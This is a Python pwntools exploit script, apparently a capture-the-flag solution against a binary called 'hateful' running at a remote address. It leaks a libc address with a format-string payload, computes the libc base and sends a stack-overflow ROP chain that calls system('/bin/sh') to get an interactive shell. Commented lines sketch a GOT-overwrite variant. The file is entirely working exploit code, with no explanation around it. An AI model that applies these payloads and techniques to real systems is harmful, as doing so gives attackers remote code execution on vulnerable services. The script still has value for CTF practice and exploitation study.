#!/usr/bin/env python3

from pwn import *

exe = ELF("./hateful_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("52.59.124.14", 5020)

    return r


def main():
    r = conn()

    payload = b'yay'
    r.sendlineafter(b'>> ', payload)

    input()

    # Leak libc address
    payload = b'%117$p%129$p'
    r.sendlineafter(b'>> ', payload)
    r.recvuntil(b'provided: ')
    datas = r.recvuntil(b'\n', drop=True).split(b'0x')
    print(datas)
    libc_leak = int(datas[1].decode(), 16)
    print("Libc leak: " + hex(libc_leak))
    libc.address = libc_leak - 0x80fc5
    print("Libc base: " + hex(libc.address))

    # Leak exe address
    # exe_leak = int(datas[2], 16)
    # print("Exe leak: " + hex(exe_leak))
    # exe.address = exe_leak - 0x41a0
    # print("Exe base: " + hex(exe.address))

    pop_rdi = 0x00000000000277e5
    ret = 0x0000000000026e99
    payload = b'a'*0x3f8 + p64(pop_rdi + libc.address) + p64(next(libc.search(b'/bin/sh'))) + p64(ret + libc.address)
    payload += p64(libc.sym['system'])
    # payload = b'a'*0x3f8 + p64(ret + libc.address) + p64(pop_rdi + libc.address) + p64(next(libc.search(b'/bin/sh')))
    # payload +=  p64(libc.sym['system'])
    
    # GOT overwrite
    # part1 = libc.sym['system'] & 0xff
    # part2 = libc.sym['system'] >> 8 & 0xffff
    # print(hex(part1))
    # print(hex(part2))
    # payload = f'%{part1}c%10$hhn'.encode()
    # payload += f'%{part2 - part1}c%11$hn'.encode()
    # payload = payload.ljust(0x20, b'P')
    # payload += p64(exe.got['puts']) + p64(exe.got['puts'] + 1)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
